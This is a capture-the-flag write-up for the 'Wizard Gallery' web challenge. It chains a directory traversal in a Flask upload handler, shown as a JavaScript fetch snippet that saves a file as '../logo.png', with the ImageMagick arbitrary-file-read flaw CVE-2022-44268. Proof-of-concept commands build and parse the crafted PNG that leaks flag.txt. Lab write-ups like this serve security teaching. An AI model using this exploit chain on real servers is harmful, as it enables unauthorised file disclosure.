# Wizard Gallery 
- Description: The council's top priority is to protect the flag, no matter the cost. Oh hey look, it's a photo gallery. What could go wrong? Hint: RCE is a luxury nowadays.
WizardGallery.zip:attachments/WizardGallery.zip

# Writeup

Upon visiting the webpage, we reach an upload button. Uploading an image will redirect to the gallery (`/gallery`), where you can see all previously uploaded images.

After opening main.py, we can look at the upload_file function.

```python
if '.' not in file.filename:
    wipe_upload_directory()
    return jsonify({'success': False, 'message': '🚨 ATTACK DETECTED! Suspicious file without extension detected on the union network. All gallery files have been wiped for security. The Sorcerer\'s Council has been notified.'}), 403
    
if is_blocked_extension(file.filename):
    wipe_upload_directory()
    return jsonify({'success': False, 'message': '🚨 ATTACK DETECTED! Malicious executable detected on the union network. All gallery files have been wiped for security. The Sorcerer\'s Council has been notified.'}), 403
    
```

After analyzing is_blocked_extension and wipe_upload_directory, it becomes clear that attempting to upload a file with no extension or an extension in the BLOCKED_EXTENSIONS array will result in all images currently in the uploads directory to get wiped. 

```python
if file and allowed_file(file.filename):
```

Moreover, only files in the ALLOWED_EXTENSIONS array will be uploaded. The rest will be rejected. Now looking at the file saving code:

```python
file_path = os.path.join(app.config['UPLOAD_FOLDER'], original_filename)    
file.save(file_path)
```
This shows a clear directory traversal attack, which can let us save files outside of the uploads directory, by modifying the filename property inside the FormData that we send from the client.

Despite this, we are still unable to access the flag, because all extensions besides image formats are blocked, and so overwriting main.py or similar is not an option.

Looking back into main.py we find:

```python
@app.route('/logo-sm.png')
def logo_small():
    logo_sm_path = os.path.join(app.config['UPLOAD_FOLDER'], 'logo-sm.png')
    if not os.path.exists(logo_sm_path):
        os.system("magick/bin/convert logo.png -resize 10% " + os.path.join(app.config['UPLOAD_FOLDER'], 'logo-sm.png'))
    
    return send_from_directory(app.config['UPLOAD_FOLDER'], 'logo-sm.png')
```

This function seems to check if a file called logo-sm.png exists, and not, resizes logo.png from the main directory and serves it on the path /logo-sm.png. In the code for index.html, we can see it is used if a mobile device is detect on the front page.

Looking at the `os.system` line, the code runs the convert ImageMagick binary from the specified directory. Attempting to find this binary version, we get:

```bash
$ magick/bin/convert -version
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
```

After looking on a CVE tracker, we find that this version is vulnerable to a arbritrary read exploit `CVE-2022-44268`. The exploit involves using a modified png file that will read and embed file data in itself after being passed through ImageMagick. The exploit is demoed [here](https://github.com/vulhub/vulhub/tree/master/imagemagick/CVE-2022-44268). After downloading the given script, we can run it on any PNG that we provide, and tell it to read and embed flag.txt:

```bash
python3 poc.py generate -i logo_orig.png -o logo_exp.png -r flag.txt
```

Since the resize command is used on logo.png in the root directory, we can use our directory traversal exploit to replace that file on the server with our own.

To do this, we can use some client javascript. First, use the file picker to select the modified image. Next, use the following snippet in the console to POST that file after modifying the filename to `../logo.png`.

```javascript
const fileInput = document.querySelector('input[type="file"]');
const originalFile = fileInput.files[0];

const formData = new FormData();

formData.append('file', originalFile, '../logo.png');

const response = await fetch('/upload', {
    method: 'POST',
    body: formData
});
```

After this, we can wipe the uploads directory by uploading a blacklisted file extension (e.g .py). This is to remove the cached version of logo-sm.png which is saved in the uploads directory. Now, when we GET /logo-sm.png, we will recieve an image which contains our flag. To extract the flag, we can use the same tool as above:

```bash
python3 poc.py parse -i logo-sm.png
```

After running, we find the line which includes `Raw profile type`:

```bash
$ python3 poc.py parse -i logo-sm.png
...
2025-08-01 21:41:36,337 - INFO - chunk tEXt found, value = b'Raw profile type txt\x00\ntxt\n      18\n7363726970744354467b544553543132337d\n'
```
The segment between the two `\n`s is a hex string that can be decoded to become:
```
scriptCTF{TEST123}
```

# Flag - Randomly generated per user